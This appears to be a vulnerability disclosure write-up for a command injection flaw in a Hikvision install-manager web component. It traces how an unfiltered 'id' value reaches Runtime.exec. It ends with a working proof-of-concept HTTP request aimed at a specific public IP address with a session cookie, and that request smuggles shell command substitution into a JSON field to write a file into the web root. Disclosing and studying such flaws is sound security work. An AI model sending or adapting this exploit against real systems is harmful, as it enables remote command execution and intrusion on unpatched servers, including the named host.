In the `center/WEB-INF/lib/hik-icd-installmanager-1.3.0-SNAPSHOT/com/hikvision/installmanager/controller/deployment/DeployController.java` method `getDetection`, the parameters `type` and `operate` are accepted respectively, and the value of the parameter `type` is Must be environment.
Then execute, `detectResponse = this.installDetectService.getSystemDetect(detectionRequest, operate);`  
![image](https://github.com/night-0p/anh/assets/54882616/ea03f6d7-9a2e-4b65-b022-01ba4ce99c44)
![image](https://github.com/night-0p/anh/assets/54882616/0f37416f-4d9c-46cb-af38-1740150da746)
`installDetectService#getSystemDetect `  
![image](https://github.com/night-0p/anh/assets/54882616/6a0db0a9-fd37-47b9-89f4-8fe60e7dbeba)
Obtain the array of machines in line 727, then traverse the array of machines, obtain the value of the id key through `String agentNo = machineInstallation.getId()` and assign it to agentNo. In line 87, execute `this.rMachineSelector.findMachineInformation(agentNo)`
![image](https://github.com/night-0p/anh/assets/54882616/f12dd6ac-e46a-4c33-b849-271b898c1c31)
Afterwards, `ReturnSystemDto returnSystemDto = this.agentTaskService.findMachineBasicInformation(agentNo)` is executed, and the convertExecuteCommand method is called in the findMachineBasicInformation method.
![image](https://github.com/night-0p/anh/assets/54882616/c992cd70-8bc7-4a77-8c28-0e6a81357c4b)
In the convertExecuteCommand method of the CommandConvertUtils class, line 56, oneParameter performs splicing commands without filtering. In line 63, the value of cmdArray is returned
![image](https://github.com/night-0p/anh/assets/54882616/1c723f64-f498-4223-a368-fa0a8c7db014)
`Execute CommandExecuteUtils.executeCommand(cmdArray)`; in line 110
![image](https://github.com/night-0p/anh/assets/54882616/8946b725-6128-491f-8f5f-3ef2115dcf94)
Final execution `process = Runtime.getRuntime().exec(cmdArray);`
![image](https://github.com/night-0p/anh/assets/54882616/bc4bf312-23c9-4fb9-a029-565eeed3038d)

poc:
```
POST /center/api/installation/detection HTTP/1.1
Host: 211.142.73.227:1443
Cookie: JSESSIONID=727F097DC9E5183149DB9F8FF4564D7E
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.47(0x18002f28) NetType/WIFI Language/zh_CN
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 3663

{"type":"environment",
"operate":"",
"machines":{"id":  "$(echo 'dGVzdA==' | base64 --decode >/opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/test.txt)"}}
```
Execute POC
![image](https://github.com/night-0p/anh/assets/54882616/35c9a116-a0b3-4b14-8ffe-e559a1bb1d17)
Verify results
![image](https://github.com/night-0p/anh/assets/54882616/72da401d-dd89-4ddd-9c8e-462033255979)
